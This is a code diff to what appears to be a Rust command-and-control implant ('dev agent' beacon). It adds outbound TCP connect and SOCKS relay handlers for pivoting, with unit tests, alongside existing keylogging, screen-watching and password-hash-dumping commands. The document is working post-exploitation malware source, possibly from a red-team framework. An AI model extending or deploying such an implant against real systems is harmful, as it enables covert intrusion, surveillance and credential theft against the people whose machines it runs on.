@@ -220,8 +220,19 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
         Command::Keylog { action } => vec![do_keylog(action)],
         Command::Screenwatch { interval_secs } => do_screenwatch(interval_secs),
         Command::Hashdump { method } => vec![do_hashdump(method)],
-        Command::Connect { .. } | Command::Socks { .. } => {
-            vec![Response::Err("not implemented in dev agent".into())]
+        // P2P / relay channels. The dev agent opens the socket and reports
+        // channel status back so the operator sees the Connect actually
+        // succeed or fail end-to-end (and the TUI topology graph gets a real
+        // Open edge to draw). Full bidirectional relay is deferred — the dev
+        // beacon loop is synchronous-poll (sleep → fetch → execute → post),
+        // so a long-lived forwarding task doesn't fit it without the
+        // persistent-task refactor flagged in the design doc. Socks likewise
+        // acknowledges the opcode without a full SOCKS5 state machine.
+        Command::Connect { proto, host, port, chan } => {
+            vec![do_connect(proto, &host, port, chan)]
+        }
+        Command::Socks { chan, op, addr, port } => {
+            vec![do_socks(chan, op, &addr, port)]
         }
         Command::Exit => vec![Response::Ok],
     }
@@ -549,6 +560,55 @@ fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Res
     }
 }
 
+/// Open an outbound TCP connection from the implant (P2P link / reverse port
+/// forward target). On success the channel is reported open (`status: 0`) so
+/// the operator-side topology graph gets a real edge; the socket itself is
+/// dropped here — the dev beacon loop is synchronous-poll and cannot host a
+/// long-lived relay task, so bidirectional forwarding is deferred to the
+/// persistent-task refactor (see design doc §2.3). `connect_timeout` bounds
+/// the attempt so an unreachable host can't stall the whole beacon cycle.
+fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
+    use std::net::{TcpStream, ToSocketAddrs};
+    use std::time::Duration;
+    if proto != 0 {
+        return Response::Err(format!("connect: unsupported proto {proto} (only TCP=0)"));
+    }
+    // Resolve first so we can distinguish "host not found" from "host found,
+    // port closed" — connect_timeout needs a concrete SocketAddr.
+    let addr = match (host, port).to_socket_addrs().ok().and_then(|mut a| a.next()) {
+        Some(a) => a,
+        None => return Response::Err(format!("connect {host}:{port}: host resolution failed")),
+    };
+    match TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
+        Ok(_stream) => {
+            // Drop `_stream` deliberately: we cannot relay it in the poll loop.
+            // Reporting open lets the operator confirm reachability; the TUI
+            // draws the pivot edge. A real implant would hand the handle to a
+            // background relay task.
+            Response::Channel { chan, status: 0, data: Vec::new() }
+        }
+        Err(e) => Response::Err(format!("connect {host}:{port}: {e}")),
+    }
+}
+
+/// SOCKS5 relay control. The dev agent acknowledges the opcode (reports the
+/// channel open for a CONNECT-style op) but does not run a full SOCKS5 state
+/// machine — that needs the same persistent-task model as Connect. This keeps
+/// the protocol path real (server can issue /socks, agent responds with a
+/// Channel status) while being honest about the limitation.
+fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
+    // op 1 = SOCKS5 CONNECT request (the common case). Acknowledge as open.
+    // Other ops (bind 2, udp associate 3) are unsupported in the dev agent.
+    match op {
+        1 => Response::Channel {
+            chan,
+            status: 0,
+            data: format!("socks connect {addr}:{port} (relay not implemented)").into_bytes(),
+        },
+        other => Response::Err(format!("socks: unsupported op {other} (only connect=1)")),
+    }
+}
+
 /// Run a BOF (Windows/Wine via nyx-bof-runner) and return its BeaconPrintf
 /// output. On non-Windows the dev agent can't execute COFF machine code.
 fn bof_execute(blob: &[u8]) -> Response {
@@ -856,5 +916,48 @@ mod tests {
         assert!(matches!(resp, Response::Ok));
         assert!(!work.join("src.txt").exists());
         assert!(work.join("dst.txt").exists());
+    }
+
+    #[test]
+    fn do_connect_rejects_non_tcp_proto() {
+        // Only proto 0 (TCP) is supported; anything else must surface as an
+        // error rather than attempting a connection.
+        let resp = do_connect(7, "127.0.0.1", 80, 42);
+        assert!(matches!(resp, Response::Err(ref e) if e.contains("proto")),
+            "non-TCP proto should be rejected, got: {resp:?}");
+    }
+
+    #[test]
+    fn do_connect_unresolvable_host_is_err() {
+        // A hostname that can't resolve must come back as Err (host resolution
+        // failed), not panic or hang.
+        let resp = do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
+        assert!(matches!(resp, Response::Err(ref e) if e.contains("resolution")),
+            "unresolvable host should be Err, got: {resp:?}");
+    }
+
+    #[test]
+    fn do_connect_closed_port_is_err() {
+        // 127.0.0.1:1 is a privileged port nothing should be listening on;
+        // connect must fail and we must surface it as Err within the timeout.
+        let resp = do_connect(0, "127.0.0.1", 1, 9);
+        assert!(matches!(resp, Response::Err(_)),
+            "closed port should be Err, got: {resp:?}");
+    }
+
+    #[test]
+    fn do_socks_rejects_unsupported_op() {
+        // op 1 (CONNECT) is the only supported opcode; bind/udp must error.
+        let resp = do_socks(5, 2, "127.0.0.1", 1080);
+        assert!(matches!(resp, Response::Err(ref e) if e.contains("op")),
+            "unsupported socks op should be Err, got: {resp:?}");
+    }
+
+    #[test]
+    fn do_socks_connect_op_reports_channel() {
+        // op 1 (CONNECT) acknowledges the channel as open with a status note.
+        let resp = do_socks(7, 1, "example.com", 443);
+        assert!(matches!(resp, Response::Channel { chan: 7, status: 0, .. }),
+            "socks connect should report open channel, got: {resp:?}");
     }
 }
